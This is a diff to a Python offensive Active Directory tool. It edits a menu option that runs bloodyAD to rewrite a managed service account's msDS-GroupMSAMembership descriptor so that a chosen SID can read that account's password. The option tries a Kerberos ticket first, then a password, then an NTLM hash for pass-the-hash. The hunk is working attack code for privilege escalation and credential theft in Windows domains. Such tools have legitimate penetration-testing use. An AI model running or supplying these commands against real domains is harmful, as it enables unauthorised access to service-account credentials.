@@ -4951,28 +4951,29 @@ while True:
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
 # Details : Menu option selected - 
-# Old : Menu option selected - Bloody-AD PATCH MSA 						NEED TO CHECK THAT THE SID PART IS CORRECTLY SET UP !!!
+# Old : Menu option selected - Bloody-AD PATCH MSA
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '608':
       AD1 = input("[?] Please enter MSA users name: ")
       AD2 = "msDS-GroupMSAMembership"
+      AD3 = input("[?] Please enter the target SID user value: ")
       SKEW = timeSync(SKEW)
       if PAS[:2] != "''":   
          try:
             print("[i] Using ticket as credential...")
-            localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -k set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + SID.rstrip(" ") + ")'") 
+            localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -k set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + AD3.rstrip(" ") + ")'") 
          except:
             print("[-] Failed to patch MSA using ticket...") 
             try:
                print("[i] Using password as credential...")    
-               localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + SID.rstrip(" ") + ")'") 
+               localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + AD3.rstrip(" ") + ")'") 
             except:
                print("[-] Failed to patch MSA using password ...")
                try:
                   print("[i] Using HASH value as credential...")    
-                  localCOM("bloodyAD --host " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + SID.rstrip(" ") + ")'")
+                  localCOM("bloodyAD --host " + SDM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " set object " + AD1.rstrip(" ") + " " + AD2.rstrip(" ") + " -v 'O:SYD:(A;;0x00020094;;;" + AD3.rstrip(" ") + ")'")
                except:
                   print("[-] Failed to patch MSA using HASH value...") 
       prompt()
